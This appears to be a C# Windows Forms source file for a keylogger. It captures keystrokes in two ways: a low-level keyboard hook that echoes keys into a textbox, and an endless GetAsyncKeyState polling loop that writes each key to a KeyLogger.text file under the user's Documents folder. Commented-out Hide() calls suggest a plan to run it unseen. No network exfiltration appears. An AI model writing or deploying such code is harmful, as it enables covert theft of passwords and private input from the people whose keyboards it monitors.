using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;
using System.Threading;

namespace ExaminationSp
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
                   LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public Form1()
        {
            InitializeComponent();
            UpdateStartStopButtons();
           // Form1 form1 = new Form1();
           // form1.Visible = false;
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL,
                                         proc,
                                         GetModuleHandle(curModule.ModuleName),
                                         0);
            }
        }
        private static Form1 _this = null;
        private static IntPtr HookCallback(int nCode,
                                            IntPtr wParam,
                                            IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                if (_this != null)
                {
                    int keyCode = Marshal.ReadInt32(lParam);
                    string keyString = VK_KEYS.vkKeyArray[keyCode];
                    //string keyString = Convert.ToChar(keyCode).ToString();
                    if (keyString.Length > 1)
                        _this.textBox1.Text = _this.textBox1.Text + "[" + keyString + "]";
                    else
                        _this.textBox1.Text += keyString;
                }
                //using( StreamWriter sw = File.AppendText( path ) )
                //{
                //  sw.Write( keyString ); // Пишем в файл ...
                //}
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void Start1_Click(object sender, EventArgs e)
        {
            if (_hookID == IntPtr.Zero)
                _hookID = SetHook(_proc);
            if (_hookID != IntPtr.Zero)
                _this = this;
            UpdateStartStopButtons();

        }

        private void Stop_Click(object sender, EventArgs e)
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
                _this = null;
            }
            UpdateStartStopButtons();
        }
        private void UpdateStartStopButtons()
        {
            bool IsSetHook = (_hookID == IntPtr.Zero);
            Start1.Enabled = IsSetHook;
            Stop.Enabled = !IsSetHook;
        }
        private delegate IntPtr LowLevelKeyboardProc(
       int nCode, IntPtr wParam, IntPtr lParam);

        private void Form1_Load(object sender, EventArgs e)
        {
           // Hide();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            //Hide();

        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            //Hide();

        }

        private void Start2_Click(object sender, EventArgs e)
        {

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            filepath = filepath + @"\AlphaFolder\";
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (filepath + "KeyLogger.text");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            KeysConverter converter = new KeysConverter();
            string text = "";
            while (5 > 1)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 2000; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter streamWriter = File.AppendText(path))
                        {
                            streamWriter.WriteLine(text);
                        }
                        break;
                    }
                }
            }
        }
    }
}
